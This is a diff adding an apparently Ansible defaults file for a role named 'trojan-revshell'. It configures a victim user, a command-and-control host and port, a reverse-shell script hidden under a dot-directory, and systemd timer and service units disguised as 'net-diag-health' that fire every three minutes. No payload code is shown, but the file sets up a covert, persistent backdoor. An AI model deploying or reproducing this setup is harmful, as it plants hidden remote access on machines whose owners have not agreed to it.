@@ -1,0 +1,11 @@
+---
+# defaults file for trojan-revshell
+
+victim_user: cyrano
+c2_host: c2-server
+c2_port: 5555
+revshell_schedule: "*:0/3"
+revshell_script_path: /usr/local/lib/.netd/revshell.sh
+revshell_log: /var/lib/.netd/revshell.log
+revshell_timer_unit: "net-diag-health.timer"
+revshell_service_unit: "net-diag-health.service"
